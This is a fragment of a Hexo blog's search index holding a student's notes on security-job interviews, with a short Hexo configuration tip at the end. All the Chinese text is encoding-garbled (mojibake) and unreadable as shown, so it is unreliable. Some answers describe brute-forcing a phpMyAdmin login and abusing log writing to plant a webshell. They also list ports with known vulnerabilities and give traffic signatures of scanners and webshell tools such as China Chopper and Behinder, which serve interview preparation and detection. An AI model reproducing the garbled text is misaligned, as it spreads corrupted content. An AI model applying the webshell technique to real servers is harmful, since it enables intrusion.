<h3 id="é‚£ä½ æ˜¯æ€ä¹ˆå»æŸ¥çœ‹æ—¥å¿—çš„å‘¢ï¼Ÿ"><a href="#é‚£ä½ æ˜¯æ€ä¹ˆå»æŸ¥çœ‹æ—¥å¿—çš„å‘¢ï¼Ÿ" class="headerlink" title="é‚£ä½ æ˜¯æ€ä¹ˆå»æŸ¥çœ‹æ—¥å¿—çš„å‘¢ï¼Ÿ"></a>é‚£ä½ æ˜¯æ€ä¹ˆå»æŸ¥çœ‹æ—¥å¿—çš„å‘¢ï¼Ÿ</h3><p>ç­”ï¼šé‚£ä¸ªç³»ç»Ÿæ˜¯å¥½åƒä¸€ä¸ªwindow2008ï¼Œä½¿ç”¨çš„æ˜¯Apacheï¼Œä¸€èˆ¬Apacheçš„æ—¥å¿—å¥½åƒæ˜¯httpd</p>
<h3 id="æ˜¯httpdå—ï¼Ÿ"><a href="#æ˜¯httpdå—ï¼Ÿ" class="headerlink" title="æ˜¯httpdå—ï¼Ÿ"></a>æ˜¯httpdå—ï¼Ÿ</h3><p>ç­”ï¼šè¿™ä¸ªæˆ‘æœ‰äº›å¿˜è®°äº†ï¼Œä¸å¥½æ„æ€ï¼ˆå½“æ—¶æ²¡æƒ³å‡ºæ¥ï¼Œlogs/access.logå’Œlog/error.logï¼‰</p>
<h3 id="hrï¼šè¡Œï¼Œä½ çš„æƒ…å†µæˆ‘å¤§ä½“äº†è§£äº†ï¼Œå½“æ—¶å€™ä¼šç»™ä¸ªæ•´ä½“åé¦ˆï¼Œå†è§ã€‚"><a href="#hrï¼šè¡Œï¼Œä½ çš„æƒ…å†µæˆ‘å¤§ä½“äº†è§£äº†ï¼Œå½“æ—¶å€™ä¼šç»™ä¸ªæ•´ä½“åé¦ˆï¼Œå†è§ã€‚" class="headerlink" title="hrï¼šè¡Œï¼Œä½ çš„æƒ…å†µæˆ‘å¤§ä½“äº†è§£äº†ï¼Œå½“æ—¶å€™ä¼šç»™ä¸ªæ•´ä½“åé¦ˆï¼Œå†è§ã€‚"></a>hrï¼šè¡Œï¼Œä½ çš„æƒ…å†µæˆ‘å¤§ä½“äº†è§£äº†ï¼Œå½“æ—¶å€™ä¼šç»™ä¸ªæ•´ä½“åé¦ˆï¼Œå†è§ã€‚</h3><p>ç­”ï¼šå¥½çš„ï¼Œéº»çƒ¦æ‚¨äº†ï¼Œå†è§~</p>
<p><em>é¢è¯•æ¥çš„æŒºçªç„¶çš„ï¼Œå½“æ—¶åˆšè¦å»å‡ºå»åƒæ™šé¥­ï¼Œæ€»å…±èŠäº†10åˆ†é’Ÿï¼Œæ„Ÿè§‰å›ç­”çš„ä¸æ˜¯å¾ˆå¥½ï¼Œæœ€åå‡‰äº†ğŸ˜­</em></p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡hwé¢è¯•ç»å†(2)</title>
    <url>/posts/e9000575/</url>
    <content><![CDATA[<h3 id="ç°åœ¨æ˜¯ä¸æ˜¯ä¸Šå¤§å­¦ï¼Œ4æœˆä»½æ˜¯å¦æœ‰æ—¶é—´ï¼Œ"><a href="#ç°åœ¨æ˜¯ä¸æ˜¯ä¸Šå¤§å­¦ï¼Œ4æœˆä»½æ˜¯å¦æœ‰æ—¶é—´ï¼Œ" class="headerlink" title="ç°åœ¨æ˜¯ä¸æ˜¯ä¸Šå¤§å­¦ï¼Œ4æœˆä»½æ˜¯å¦æœ‰æ—¶é—´ï¼Œ"></a>ç°åœ¨æ˜¯ä¸æ˜¯ä¸Šå¤§å­¦ï¼Œ4æœˆä»½æ˜¯å¦æœ‰æ—¶é—´ï¼Œ</h3><p>ç­”: ç°åœ¨å¤§ä¸‰åœ¨è¯»ï¼Œ4æœˆä»½æœ‰æ—¶é—´å¯ä»¥å‡ºæ¥</p>
<h3 id="ä»‹ç»ä¸‹ç®€å†é‡Œçš„ç»å†"><a href="#ä»‹ç»ä¸‹ç®€å†é‡Œçš„ç»å†" class="headerlink" title="ä»‹ç»ä¸‹ç®€å†é‡Œçš„ç»å†"></a>ä»‹ç»ä¸‹ç®€å†é‡Œçš„ç»å†</h3><p>ç­”: é’“é±¼çš„æœåŠ¡å™¨ä¹‹å‰åœ¨qqç¾¤é‡Œçœ‹åˆ°è¿‡ï¼Œè¿›è¡Œä¿¡æ¯æœé›†æ‰«åˆ°phpmyadmin ç„¶åçˆ†ç ´<span id="more"></span>ä¹‹åå¼€å¯å†™å…¥æ—¥å¿—çš„è®¾ç½® å†™å…¥webshell<br>ç„¶åå°±è¯´äº†ä¸‹é‚£æ¬¡å›¾ä¹¦é¦†çš„ä¸€æ¬¡ä¸å®Œæ•´çš„æº¯æºç»å†ï¼Œæ—¶é—´æœ‰äº›ä¹…äº†è®°å¾—ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œè€Œä¸”é‚£æ—¶å€™ç¬¬ä¸€æ¬¡æ¥è§¦è¿™ä¸ªï¼Œä¸»è¦æœ‰ä¸¤ä¸ªç°è±¡ï¼Œä¸€æ˜¯æ­£å¸¸ç™»é™†æ—¶ä¼šè¢«æ³¨é”€ï¼ŒäºŒæ˜¯mysqlæ— æ³•æ­£å¸¸å¯åŠ¨ã€‚<br>ç”±äºç³»ç»Ÿæ˜¯window2008 ä¸”ä½¿ç”¨çš„phpstudyè‡ªè¡Œæ­å»ºçš„ ä¹‹å‰æœ‰è¿‡è¢«å…¥ä¾µçš„è®°å½•ï¼Œä¹Ÿå­˜åœ¨ç€ä¸€äº›è¢«éæ³•æ·»åŠ çš„è´¦å·ï¼Œç„¶åå°±åœ¨æ³¨å†Œè¡¨ä¸­åˆ é™¤äº†ä¸€ç³»åˆ—çš„è´¦æˆ·ï¼Œ<br>åœ¨msconfigä¸­å¼€å¯äº†mysqlæœåŠ¡ï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•æ­£å¸¸ç™»é™†ã€‚<br>netstat -anoçœ‹äº†ä¸‹å¼€å¯çš„ç«¯å£ï¼Œå‘ç°å¼€å¯äº†80 Apache 808 iis 135ç«¯å£ã€‚<br>æŸ¥çœ‹äº‹ä»¶æŸ¥çœ‹å™¨å»çœ‹ä¸€äº›å¼‚å¸¸<br>id<br>4624 è´¦å·ç™»é™†æˆåŠŸ<br>4625 è´¦å·ç™»é™†å¤±è´¥<br>4720 åˆ›å»ºè´¦å·<br>4726 åˆ é™¤è´¦å·</p>
<h3 id="æœ‰æ²¡æœ‰è¿‡ç›¸å…³çš„æŠ¤ç½‘ç»éªŒ"><a href="#æœ‰æ²¡æœ‰è¿‡ç›¸å…³çš„æŠ¤ç½‘ç»éªŒ" class="headerlink" title="æœ‰æ²¡æœ‰è¿‡ç›¸å…³çš„æŠ¤ç½‘ç»éªŒ"></a>æœ‰æ²¡æœ‰è¿‡ç›¸å…³çš„æŠ¤ç½‘ç»éªŒ</h3><p>ç­”: æ²¡æœ‰è¿‡hwç»éªŒï¼Œä½†æ˜¯æˆ‘ä¼šå»å­¦ä¹ å»äº†è§£</p>
<h3 id="æ˜¯å¦æœ‰ä½¿ç”¨è¿‡å®‰å…¨äº§å“"><a href="#æ˜¯å¦æœ‰ä½¿ç”¨è¿‡å®‰å…¨äº§å“" class="headerlink" title="æ˜¯å¦æœ‰ä½¿ç”¨è¿‡å®‰å…¨äº§å“"></a>æ˜¯å¦æœ‰ä½¿ç”¨è¿‡å®‰å…¨äº§å“</h3><p>ç­”: åªæ¥è§¦è¿‡Dç›¾ï¼Œåˆ«çš„è®¾å¤‡æ²¡æ¥è§¦è¿‡</p>
<h3 id="è¯´ä¸€ä¸‹å¸¸è§çš„ç«¯å£å’Œæ¼æ´"><a href="#è¯´ä¸€ä¸‹å¸¸è§çš„ç«¯å£å’Œæ¼æ´" class="headerlink" title="è¯´ä¸€ä¸‹å¸¸è§çš„ç«¯å£å’Œæ¼æ´"></a>è¯´ä¸€ä¸‹å¸¸è§çš„ç«¯å£å’Œæ¼æ´</h3><p>ç­”:<br>1433 mssql<br>1521 orcale<br>3306 mysql<br>4376 Redisæœªæˆæƒè®¿<br>7001 weblogic ååºåˆ—åŒ–<br>445 æ°¸æ’ä¹‹è“</p>
<h3 id="è¯´ä¸€ä¸‹å¸¸ç”¨çš„å®‰å…¨å·¥å…·çš„æµé‡ç‰¹å¾"><a href="#è¯´ä¸€ä¸‹å¸¸ç”¨çš„å®‰å…¨å·¥å…·çš„æµé‡ç‰¹å¾" class="headerlink" title="è¯´ä¸€ä¸‹å¸¸ç”¨çš„å®‰å…¨å·¥å…·çš„æµé‡ç‰¹å¾"></a>è¯´ä¸€ä¸‹å¸¸ç”¨çš„å®‰å…¨å·¥å…·çš„æµé‡ç‰¹å¾</h3><p>ç­”:<br>awvsçš„åœ¨header url body ä¸‰é¡¹ä¸­éƒ½ä¼šæœ‰a%#-wvs<br>sqlmapçš„ ä¼šåœ¨uaæ˜¾ç¤ºsqlmapçº§ç‰ˆæœ¬å· å’Œ sqlmapç½‘å€<br>appscan url headerå’Œbkdyä¸­éƒ½ä¼šæœ‰appscan<br>ç„¶åè¯´äº†ä¸‹èœåˆ€å¤§å¤šä½¿ç”¨base64ç¼–ç ï¼Œevalå’Œassertä¼šè¢«éš”å¼€</p>
<h3 id="è¯´ä¸€ä¸‹å†°èçš„æµé‡ç‰¹å¾"><a href="#è¯´ä¸€ä¸‹å†°èçš„æµé‡ç‰¹å¾" class="headerlink" title="è¯´ä¸€ä¸‹å†°èçš„æµé‡ç‰¹å¾"></a>è¯´ä¸€ä¸‹å†°èçš„æµé‡ç‰¹å¾</h3><p>ç­”: è¿™ä¸ªæœ‰ç‚¹ä¸è®°å¾—äº†<br>æ³¨:(å†°è<br>1.content-typeä¸€å®šä¸ºapplication/octet-stream<br>2.å†…ç½®17ä¸ªUA Mozilla4/5<br>3.payloadå®šé•¿ä¸”æ— éšæœºå¡«å……éƒ¨åˆ†(padding)<br>)</p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoé˜…è¯»å…¨æ–‡è®¾ç½®</title>
    <url>/posts/5605128/</url>
    <content><![CDATA[<p>ä½¿ç”¨<code>&lt; !--more--&gt;</code>æ ‡ç­¾æ‰‹åŠ¨æˆªæ–­ æˆ–è€…<br>æ–‡ä»¶å¤¹ä¸‹çš„scaffoldsæ–‡ä»¶å¤¹ä¸­çš„post.mdä¸­æ·»åŠ ä¸€è¡Œ<code>description:&quot; &quot;</code> å³å¯åœ¨è¾“å…¥<code>hexo new post </code>åšå®¢æ ‡é¢˜å‘½ä»¤æ–°å»º.mdæ–‡ä»¶æ—¶è‡ªåŠ¨åŠ ä¸Š<code>description:&#39; &#39;</code> åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºé˜…è¯»å…¨æ–‡æŒ‰é’®ä¸”ä¸å¸¦æ‘˜è¦ã€‚</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
